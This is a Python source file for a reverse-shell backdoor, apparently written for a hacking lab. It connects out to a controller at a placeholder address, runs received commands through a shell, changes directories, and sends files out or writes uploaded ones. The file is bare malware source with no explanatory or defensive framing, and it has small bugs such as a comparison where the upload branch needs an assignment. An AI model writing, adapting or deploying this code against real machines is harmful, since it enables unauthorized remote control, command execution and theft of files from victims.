import socket
import subprocess
import simplejson
import os
import base64

class Sockett():
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def executioner(self, command):
        return subprocess.check_output(command, shell=True)

    def send_json(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    def recv_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
    def changeDirectory(self,directory):
        os.chdir(directory)

    def download_file(self,file):
        with open(file,"rb") as efile:
            return base64.b64encode(efile.read())

    def upload_file(self,file,content):
        with open(file,"wb") as efile:
            efile.write(base64.b64decode(content))
            return "UPLOAD OK"


    def start(self):
        while True:
            command = self.recv_json()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command)>1:
                    command_output = self.changeDirectory(command[1])
                elif command[0] == "download":
                    command_output = self.download_file(command[1])
                elif command[0] == "upload":
                    command_output == self.upload_file(command[1],command[2])
                else:
                    command_output = self.executioner(command)
            except Exception:
                command_output = "Error!"
            self.send_json(command_output)            
        self.connection.close()

if __name__ == "__main__":
    socket1 = Sockett("10.0.2.X", your_port)
    socket1.start()
